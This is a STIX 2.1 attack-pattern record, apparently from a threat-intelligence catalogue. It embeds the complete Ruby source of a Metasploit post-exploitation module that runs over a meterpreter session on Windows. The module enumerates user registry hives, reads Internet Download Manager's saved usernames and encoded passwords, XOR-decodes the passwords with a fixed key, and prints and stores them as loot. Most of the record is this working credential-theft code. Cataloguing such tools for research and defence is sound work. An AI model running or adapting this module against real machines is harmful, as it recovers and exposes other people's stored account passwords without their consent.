{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1fbcfca8-78da-4685-b1dd-4ed0769aa0ec",
    "created": "2024-08-14T16:33:11.448938Z",
    "modified": "2024-08-14T16:33:11.448942Z",
    "name": "Windows Gather Internet Download Manager (IDM) Password Extractor",
    "description": " This module recovers the saved premium download account passwords from Internet Download Manager (IDM). These passwords are stored in an encoded format in the registry. This module traverses through these registry entries and decodes them. Thanks to the template code of theLightCosine's CoreFTP password module.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/idm.rb",
            "external_id": "idm.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Internet Download Manager (IDM) Password Extractor',\n        'Description' => %q{\n          This module recovers the saved premium download account passwords from\n          Internet Download Manager (IDM). These passwords are stored in an encoded\n          format in the registry. This module traverses through these registry entries\n          and decodes them. Thanks to the template code of theLightCosine's CoreFTP\n          password module.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sil3ntdre4m <sil3ntdre4m[at]gmail.com>',\n          'Unknown', # SecurityXploded Team, www.SecurityXploded.com\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n  end\n\n  def run\n    creds = Rex::Text::Table.new(\n      'Header' => 'Internet Downloader Manager Credentials',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'User',\n        'Password',\n        'Site'\n      ]\n    )\n\n    registry_enumkeys('HKU').each do |k|\n      next unless k.include? 'S-1-5-21'\n      next if k.include? '_Classes'\n\n      print_status(\"Looking at Key #{k}\")\n\n      begin\n        subkeys = registry_enumkeys(\"HKU\\\\#{k}\\\\Software\\\\DownloadManager\\\\Passwords\\\\\")\n        if subkeys.nil? || subkeys.empty?\n          print_status('IDM not installed for this user.')\n          return\n        end\n\n        subkeys.each do |site|\n          user = registry_getvaldata(\"HKU\\\\#{k}\\\\Software\\\\DownloadManager\\\\Passwords\\\\#{site}\", 'User')\n          epass = registry_getvaldata(\"HKU\\\\#{k}\\\\Software\\\\DownloadManager\\\\Passwords\\\\#{site}\", 'EncPassword')\n          next if epass.nil? || (epass == '')\n\n          pass = xor(epass)\n          print_good(\"Site: #{site} (User=#{user}, Password=#{pass})\")\n          creds << [user, pass, site]\n        end\n\n        print_status('Storing data...')\n        path = store_loot(\n          'idm.user.creds',\n          'text/csv',\n          session,\n          creds.to_csv,\n          'idm_user_creds.csv',\n          'Internet Download Manager User Credentials'\n        )\n        print_good(\"IDM user credentials saved in: #{path}\")\n      rescue ::Exception => e\n        print_error(\"An error has occurred: #{e}\")\n      end\n    end\n  end\n\n  def xor(ciphertext)\n    pass = ciphertext.unpack('C*')\n    key = 15\n    for i in 0..pass.length - 1 do\n      pass[i] ^= key\n    end\n    return pass.pack('C*')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}